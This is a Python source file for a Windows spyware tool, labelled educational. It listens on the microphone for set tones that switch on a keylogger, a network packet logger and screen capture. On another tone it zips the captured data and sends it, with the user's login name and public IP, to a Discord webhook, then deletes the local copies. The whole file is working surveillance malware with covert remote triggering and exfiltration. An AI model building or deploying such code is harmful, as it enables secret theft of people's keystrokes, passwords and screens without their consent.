################################################################################
# This software is for Windows platforms only and should not be redistributed, #
# as this was made entirely for educational and learning purposes.          :) #
################################################################################

import platform

if platform.system() != 'Windows':
    print('This program can only be ran on Windows systems. Sorry.')
    exit(1)

import pyaudio
import numpy as np
import scipy.fftpack
import keyboard
import time
import threading    
from mss import mss
from datetime import datetime
import requests
import shutil
import os
from scapy.all import sniff

CHUNK = 1024
FORMAT = pyaudio.paInt16
CHANNELS = 1
RATE = 44100

DETECT_COOLDOWN = 3.0 # Cooldown period in seconds
MAGNITUDE_THRESHOLD = 500  # Minimum magnitude to consider a frequency valid

SEND_SETUP = {
    'platform': 'discord', # Select from platform(s) below
    'platform_specific': {
        'discord': 'https://discord.com/api/webhooks/____/____'
    }
}

DETECT_FREQUENCIES = [
    # eg. Detect 500hz within a range of -50 to +50 (450Hz to 550Hz)
    # Recommended: increment by 500
    { 'freq': 10000, 'range': 50, 'enabled': True }, # Send reports & clean directory
    { 'freq': 1500, 'range': 50, 'enabled': True }, # Keylogger, toggleable
    { 'freq': 2000, 'range': 50, 'enabled': True }, # Network sniffer, toggleable
    { 'freq': 2500, 'range': 20, 'enabled': True }, # Screenshot
]

FILES = {
    'reports_directory': 'reports',
    'screenshot_directory': 'screenshots',
    
    'keylogger_reports': 'keylog.txt',
    'netsniffer_reports': 'netsniff.txt'
}

last_detection_times = { freq['freq']: 0 for freq in DETECT_FREQUENCIES }

def get_audio_data(stream, chunk):
    data = stream.read(chunk, exception_on_overflow=False)
    audio_data = np.frombuffer(data, dtype=np.int16)
    return audio_data
def analyze_frequencies(audio_data, rate):
    # Perform FFT and get the magnitude of each frequency
    fft_spectrum = np.abs(scipy.fftpack.fft(audio_data))
    freqs = np.fft.fftfreq(len(fft_spectrum), 1.0 / rate)
    return freqs[:len(freqs) // 2], fft_spectrum[:len(fft_spectrum) // 2]
def frequency_in_ranges(frequency, ranges):
    result = {
        'freq': None,
        'actual_freq': frequency,
        'found': False,
        'enabled': False
    }

    for r in ranges:
        lower_bound = r['freq'] - r['range']
        upper_bound = r['freq'] + r['range']
        if lower_bound <= frequency <= upper_bound:
            result['freq'] = r['freq']
            result['found'] = True
            result['enabled'] = r['enabled']
            break

    return result
def format_key(key):
    """Format key events for readability."""
    if key == 'space':
        return ' '
    elif key == 'enter':
        return '\n'
    elif key == 'backspace':
        return '[BACKSPACE]'
    elif key == 'tab':
        return '[TAB]'
    elif key == 'shift':
        return '[SHIFT]'
    elif key == 'caps lock':
        return '[CAPS LOCK]'
    elif key == 'ctrl':
        return '[CTRL]'
    elif key == 'alt':
        return '[ALT]'
    elif key == 'esc':
        return '[ESC]'
    else:
        return key

record_keyboard = False
keylogger_thread = None
keylogger_stop_event = threading.Event()

def on_key_event(event):
    global keylogger_stop_event, record_keyboard, keyfile
    if record_keyboard and not keylogger_stop_event.is_set() and event.event_type == keyboard.KEY_DOWN:
        key_output = format_key(event.name)
        if key_output:
            keyfile.write(f"{key_output}")
        keyfile.flush()
def enable_keylogger():
    global keylogger_stop_event, record_keyboard, keyfile
    
    if record_keyboard:
        with open(f'{FILES['reports_directory']}/{FILES['keylogger_reports']}', 'a') as f:
            f.write('\n\n-- NEW ENTRY --\n\n')
            keyfile = f
            
            keyboard.hook(on_key_event)
            
            try:
                while record_keyboard and not keylogger_stop_event.is_set():
                    continue
            finally:
                keyboard.unhook(on_key_event)

netsniff_enabled = False
netsniff_thread = None
netsniff_stop_event = threading.Event()

def enable_sniffer():
    global netsniff_enabled, netsniff_stop_event, netsniff_stop_event
    
    if netsniff_enabled and not netsniff_stop_event.is_set():
        def sniff_callback(packet):
            packet_info = f"IP: {packet['IP'].src} -> {packet['IP'].dst}\n"
            with open(f'{FILES["reports_directory"]}/{FILES["netsniffer_reports"]}', 'a') as f:
                f.write(packet_info)
                f.flush()
                
            if netsniff_stop_event.is_set():
                return
            
        sniff(filter="ip", prn=sniff_callback, stop_filter=lambda p: netsniff_stop_event.is_set())

def get_public_ip():
    try:
        response = requests.get('https://api.ipify.org?format=json')
        response.raise_for_status()
        ip_data = response.json()
        return ip_data['ip']
    except requests.RequestException:
        return 'Unable to determine IP'
def clear_directory_contents(directory_path):
    if not os.path.exists(directory_path):
        print(f"The directory {directory_path} does not exist.")
        return

    # Walk through the directory tree
    for root, dirs, files in os.walk(directory_path, topdown=False):
        for file in files:
            file_path = os.path.join(root, file)
            os.remove(file_path)
        
        for dir in dirs:
            dir_path = os.path.join(root, dir)
            shutil.rmtree(dir_path)
            os.mkdir(dir_path)

def main():
    global last_detection_times
    global keylogger_thread, record_keyboard, keylogger_stop_event # Keylogger globals
    global netsniff_thread, netsniff_enabled, netsniff_stop_event # Network sniffer globals
    
    
    p = pyaudio.PyAudio()
    stream = p.open(format=FORMAT, channels=CHANNELS,
                    rate=RATE, input=True, frames_per_buffer=CHUNK)

    print("Recording... Press Ctrl+C to stop.")

    try:
        while True:
            audio_data = get_audio_data(stream, CHUNK)
            freqs, spectrum = analyze_frequencies(audio_data, RATE)

            # Check if magnitude threshold has been reached
            valid_indices = spectrum > MAGNITUDE_THRESHOLD
            freqs = freqs[valid_indices]
            spectrum = spectrum[valid_indices]
            
            if len(freqs) == 0:
                continue

            # check if the peak frequency is somewhere in DETECT_FREQUENCIES
            peak_freq = freqs[np.argmax(spectrum)]
            detection_result = frequency_in_ranges(peak_freq, DETECT_FREQUENCIES)
            
            if detection_result['found'] and detection_result['enabled']:
                current_time = time.time()
                last_detection_time = last_detection_times[detection_result['freq']]
                
                if current_time - last_detection_time >= DETECT_COOLDOWN:
                    last_detection_times[detection_result['freq']] = current_time
                    if detection_result['freq'] == 10000: # Send reports & clean up reports directory
                        report_filename = f'report_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}'
                        shutil.make_archive(report_filename, 'zip', FILES['reports_directory'])
                        
                        if SEND_SETUP['platform'] == 'discord':
                            # open zip file and send data
                            with open(report_filename + '.zip', 'rb') as file:
                                response = requests.post(
                                    SEND_SETUP['platform_specific']['discord'],
                                    data={'content': f'A new report has been logged from {os.getlogin()} [{get_public_ip()}]'},
                                    files={'file': file}
                                )
                                
                                if response.status_code != 200:
                                    print('Unable to send reports')
                                    return
                                else:
                                    print('Reports have been sent')
                                    
                                    keylogger_stop_event.set()
                                    if keylogger_thread:
                                        keylogger_thread.join()
                                        
                                    clear_directory_contents(FILES['reports_directory'])
                                
                    elif detection_result['freq'] == 1500: # Keylogger (toggleable)
                        if record_keyboard:
                            record_keyboard = False
                            
                            keylogger_stop_event.set()
                            
                            if keylogger_thread:
                                keylogger_thread.join()
                            
                            print("Keylogger disabled")
                        else:
                            record_keyboard = True
                            
                            keylogger_stop_event.clear()
                            keylogger_thread = threading.Thread(target=enable_keylogger)
                            keylogger_thread.start()
                            
                            print("Keylogger enabled")
                    elif detection_result['freq'] == 2000: # Net sniffer (toggleable)
                        if netsniff_enabled:
                            netsniff_enabled = False
                            
                            netsniff_stop_event.set()
                            
                            if netsniff_thread:
                                netsniff_thread.join()
                            
                            print('Network sniffer disabled')
                        else:
                            netsniff_enabled = True
                            
                            netsniff_stop_event.clear()
                            netsniff_thread = threading.Thread(target=enable_sniffer)
                            netsniff_thread.start()
                            
                            print('Network sniffer enabled')
                    elif detection_result['freq'] == 2500: # Screenshot
                        save_dir = f'{FILES['reports_directory']}/{FILES['screenshot_directory']}'
                        
                        if not os.path.exists(save_dir):
                            os.makedirs(save_dir)
                        
                        with mss() as sct:
                            sct.shot(mon=-1, output=f'{save_dir}/screenshot_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.png')
                            
                        print('Screenshot taken!')

    except KeyboardInterrupt:
        print("Stopping...")
        
        keylogger_stop_event.set()
        if keylogger_thread:
            keylogger_thread.join()
            
        netsniff_stop_event.set()
        if netsniff_thread:
            netsniff_thread.join()
        
        stream.stop_stream()
        stream.close()
        p.terminate()

if __name__ == "__main__":
    main()
